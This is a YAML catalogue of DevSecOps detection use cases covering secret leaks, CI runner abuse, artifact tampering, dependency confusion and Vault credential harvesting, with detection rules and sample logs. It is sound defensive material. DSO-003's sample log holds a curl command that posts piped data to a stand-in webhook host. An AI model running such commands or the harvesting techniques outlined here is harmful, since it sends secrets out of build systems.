@@ -1,0 +1,166 @@
+category: DevSecOps
+code: DSO
+layer: Platform & Pipeline
+scope: GitHub, GitLab, Azure DevOps, Jenkins, CI/CD, artifact repositories, secrets management
+usecases:
+
+  - id: DSO-001
+    name: Secret pushed to a repository or push protection bypassed
+    severity: High
+    description: >-
+      Cloud keys, NGC API keys, Hugging Face tokens and kubeconfigs committed to ML repos get harvested within
+      minutes once public. A push-protection bypass is someone knowingly shipping a secret.
+    log_sources:
+      - GitHub audit log / secret scanning alerts
+      - GitLab audit events / secret detection
+    detection: >-
+      secret_scanning_push_protection.bypass with any reason, or a new secret-scanning alert for an active credential.
+      Raise severity when the secret type grants access to clouds, GPU registries or model hubs.
+    mappings: [T1552.001, T1213.003]
+    sample_log: |
+      {"@timestamp":1794470411000,"action":"secret_scanning_push_protection.bypass","actor":"jsmith","actor_location":{"country_code":"US"},"business":"corp","org":"corp-ai","repo":"corp-ai/llm-finetune","created_at":1794470411000,"user_agent":"git/2.47.0","secret_type":"hf_user_access_token","secret_type_display_name":"Hugging Face User Access Token","reason":"will_fix_later"}
+
+  - id: DSO-002
+    name: Branch protection or rulesets removed on infrastructure repos
+    severity: High
+    description: >-
+      Removing required reviews or status checks on repos that define GPU clusters, model serving or IaC lets a single
+      compromised account push straight to production.
+    log_sources:
+      - GitHub audit log
+      - GitLab audit events
+    detection: >-
+      protected_branch.destroy, protected_branch.update that lowers required approvals, repository_ruleset.destroy, or
+      admin enforcement turned off, on repos tagged tier-0 or infra.
+    mappings: [T1195.002, T1562.001]
+    sample_log: |
+      {"@timestamp":1794474311000,"action":"protected_branch.destroy","actor":"d.ivanov","actor_location":{"country_code":"US"},"org":"corp-ai","repo":"corp-ai/model-serving-infra","branch":"main","created_at":1794474311000,"user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}
+
+  - id: DSO-003
+    name: CI job sends secrets or data to an unknown endpoint
+    severity: High
+    description: >-
+      A modified workflow that pipes env or secrets into curl, or a poisoned dependency running on a runner that holds
+      cloud and registry credentials, ends with secrets leaving through the build.
+    log_sources:
+      - CI runner egress monitoring (Harden-Runner, proxy logs)
+      - GitHub / GitLab audit logs (workflow file changes)
+    detection: >-
+      Runner egress to domains outside the CI allow-list, especially paste, webhook or tunnel services; workflow
+      diffs that add pull_request_target with a PR-head checkout; steps that print, encode or post secrets.* values.
+    mappings: [T1195.002, T1567]
+    sample_log: |
+      {"timestamp":"2026-11-12T09:31:44Z","repo":"corp-ai/llm-finetune","workflow":".github/workflows/train.yml","run_id":12988120411,"job":"build","step":"Setup cache","runner":"gpu-runner-07","process":"curl","process_args":"curl -s -X POST -d @- https://webhook-relay.example.net/c","destination":"webhook-relay.example.net:443","egress_policy":"audit","status":"allowed","actor":"jsmith"}
+
+  - id: DSO-004
+    name: Fork pull request runs on a self-hosted GPU runner
+    severity: High
+    description: >-
+      Self-hosted GPU runners on public repos run code from any fork PR. Attackers use them to steal runner tokens and
+      cached credentials, mine, or persist on hardware inside the data center.
+    log_sources:
+      - GitHub workflow_job webhooks / audit log
+      - Runner host logs
+    detection: >-
+      Workflow jobs from fork pull requests (pull_request or pull_request_target) scheduled on runners labeled
+      self-hosted or gpu, or any public repo using self-hosted runners without first-time-contributor approval.
+    mappings: [T1195.002]
+    sample_log: |
+      {"source":"github","event":"workflow_job","action":"queued","repository":"corp-ai/open-inference-kit","visibility":"public","trigger":"pull_request_target","head_repo":"new-contributor-8812/open-inference-kit","head_repo_fork":true,"sender":"new-contributor-8812","job_id":33190211201,"run_id":12988120902,"labels":["self-hosted","linux","gpu-h100"],"queued_at":"2026-11-12T09:48:20Z"}
+
+  - id: DSO-005
+    name: Jenkins script console or credential store accessed
+    severity: High
+    description: >-
+      The Jenkins script console runs Groovy as the controller and can decrypt every stored credential, including
+      cloud, registry and cluster deploy keys used by ML pipelines.
+    log_sources:
+      - Jenkins Audit Trail plugin log
+      - Jenkins access log
+    detection: >-
+      Requests to /script or /scriptText, or credential-store pages, by anyone outside the Jenkins admin group, or by
+      service accounts at all.
+    mappings: [T1059, T1555]
+    sample_log: |
+      Nov 12, 2026 10:22:31,118 AM /scriptText by svc-ml-deployer from 10.20.31.144
+      Nov 12, 2026 10:22:44,902 AM /manage/credentials/store/system/domain/_/ by svc-ml-deployer from 10.20.31.144
+
+  - id: DSO-006
+    name: Release image or package overwritten in the artifact repository
+    severity: High
+    description: >-
+      Re-pushing an existing release tag (for example triton-custom:24.10-prod) quietly swaps what every cluster pulls
+      on its next deploy. Releases should be immutable and published only by CI.
+    log_sources:
+      - Artifact repository request / audit logs (Artifactory, Harbor, Nexus, ECR)
+    detection: >-
+      PUT of a manifest or package over an existing release tag or version, a digest change for an existing tag, or
+      any publish to release repositories by a non-CI identity.
+    mappings: [T1195.002, T1525]
+    sample_log: |
+      2026-11-12T11:02:44.118Z|8f2c1a7e5b3d4e9f|10.20.31.144|jsmith|PUT|/api/docker/ml-images/v2/inference/triton-custom/manifests/24.10-prod|201|8211|0|412|docker/27.3.1 go/go1.22.7 git-commit/41ca978 kernel/6.8.0 os/linux arch/amd64
+
+  - id: DSO-007
+    name: Dependency confusion on internal package names
+    severity: High
+    description: >-
+      Training images pull many Python packages. If an internal package name such as corp-gpu-utils resolves from
+      public PyPI with a higher version, the attacker's code runs in every build.
+    log_sources:
+      - Package proxy logs (Artifactory, Nexus, devpi)
+      - CI build logs
+    detection: >-
+      Packages matching internal name prefixes resolved from a public remote, public versions far above the internal
+      latest, or packages first published less than 7 days before being pulled into CI.
+    mappings: [T1195.001]
+    sample_log: |
+      2026-11-12T11:30:09.441Z|0a1b2c3d4e5f6a7b|10.60.4.21|svc-ci|GET|/api/pypi/pypi-virtual/packages/ce/3a/91c2f0d4e5b6/corp_gpu_utils-99.0.1-py3-none-any.whl|200|0|14211|88|pip/24.2
+      {"ts":"2026-11-12T11:30:09Z","repo":"pypi-virtual","package":"corp-gpu-utils","version":"99.0.1","resolved_from":"pypi-remote","internal_namespace_match":true,"internal_latest":"1.4.2","first_published_days":1}
+
+  - id: DSO-008
+    name: Bulk secret reads by a CI or workload identity in Vault
+    severity: High
+    description: >-
+      CI roles and workloads read a small, stable set of secret paths. One identity reading dozens of paths, or
+      production paths it has never touched, is harvesting credentials.
+    log_sources:
+      - HashiCorp Vault audit device logs
+      - Cloud secret manager audit (AWS Secrets Manager, Azure Key Vault)
+    detection: >-
+      One entity reading 50 or more distinct secret paths in 10 minutes, reading outside its 30-day path set, or a
+      CI role for a non-production repo reading secret/data/prod/*.
+    mappings: [T1555.006]
+    sample_log: |
+      {"time":"2026-11-12T12:02:31.118Z","type":"response","auth":{"client_token":"hmac-sha256:5e8f1c2a9b7d3e4f6a0b8c2d1e9f7a3b5c4d6e8f0a1b2c3d4e5f6a7b8c9d0e1f","accessor":"hmac-sha256:7a1c3e5f9b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f2a4c6e8b0d1f3a","display_name":"approle-ci-train","policies":["default","ci-train"],"metadata":{"role_name":"ci-train"},"entity_id":"9d8c7b6a-5f4e-4d3c-8b2a-1f0e9d8c7b6a","token_type":"service"},"request":{"id":"0e1f2a3b-4c5d-4e6f-8a7b-9c0d1e2f3a4b","operation":"read","mount_type":"kv","path":"secret/data/prod/inference/ngc-api-key","remote_address":"10.60.4.21","namespace":{"id":"root"}},"response":{"mount_type":"kv"}}
+
+  - id: DSO-009
+    name: Full-scope personal access token with long expiry created
+    severity: Medium
+    description: >-
+      Full-access PATs with a one-year lifetime are ideal for persistence. They survive password resets and often
+      bypass conditional access when used from scripts.
+    log_sources:
+      - Azure DevOps audit log
+      - GitHub / GitLab audit logs
+    detection: >-
+      Token.PatCreateEvent (or the GitHub/GitLab equivalent) with full-access scope (app_token) or a validity over 90
+      days, or creation from an IP or device not seen for that user.
+    mappings: [T1098.001]
+    sample_log: |
+      {"timestamp":"2026-11-12T12:30:11.4412000Z","actionId":"Token.PatCreateEvent","area":"Token","category":"Create","actorUPN":"jsmith@corp.example","actorDisplayName":"Jordan Smith","authenticationMechanism":"AAD_Cookie","ipAddress":"198.51.100.14","scopeType":"organization","scopeDisplayName":"corp-ai (Organization)","data":{"DisplayName":"automation","Scopes":"app_token","ValidTo":"2027-11-12T00:00:00Z"},"details":"Created personal access token automation with full access scope"}
+
+  - id: DSO-010
+    name: New self-hosted runner registered outside the fleet
+    severity: High
+    description: >-
+      Registering an attacker-controlled machine as a runner with gpu labels makes CI send it jobs, together with the
+      secrets and artifacts those jobs hold.
+    log_sources:
+      - GitHub audit log
+      - GitLab audit events (runner registration)
+    detection: >-
+      org.register_self_hosted_runner or repo.register_self_hosted_runner by anyone other than the runner-fleet
+      automation, or runners whose name or labels do not match the managed fleet naming.
+    mappings: [T1195.002]
+    sample_log: |
+      {"@timestamp":1794489011000,"action":"repo.register_self_hosted_runner","actor":"jsmith","actor_location":{"country_code":"NL"},"org":"corp-ai","repo":"corp-ai/model-serving-infra","runner_id":4412,"runner_name":"gpu-runner-temp","runner_labels":["self-hosted","linux","gpu-h100"],"created_at":1794489011000,"user_agent":"actions-runner/2.320.0"}
